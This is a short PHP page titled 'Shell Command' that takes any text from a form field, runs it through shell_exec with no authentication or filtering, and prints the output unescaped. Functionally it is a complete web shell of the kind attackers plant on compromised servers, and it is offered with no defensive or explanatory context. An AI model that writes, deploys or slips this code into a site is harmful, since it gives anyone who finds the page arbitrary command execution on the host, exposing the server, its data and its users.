<!DOCTYPE html>
<html>
  <head>
    <title>Shell Command</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
  </head>
  <body >
    <form style="display:flex;width:100%;gap:5px;box-sizing: border-box;margin-bottom:5px" method="post">
      <input style="padding:10px;flex:1;box-sizing: border-box;" type="text" id="command" name="command" placeholder="Enter shell command" required>
      <button style="width:100px;padding:10px;" type="submit">Execute</button>
    </form>
    
    <?php
      if($_SERVER["REQUEST_METHOD"] == "POST") {
        $command = $_POST["command"];
        $output = shell_exec($command);
        if($output){
            echo "<pre style='margin:0;border:1px solid black;padding:10px;overflow:auto'>$output</pre>";
        }else{
            echo "<pre style='margin:0;border:1px solid black;padding:10px;overflow:auto'>Null</pre>";
        }
      }
    ?>
  </body>
</html>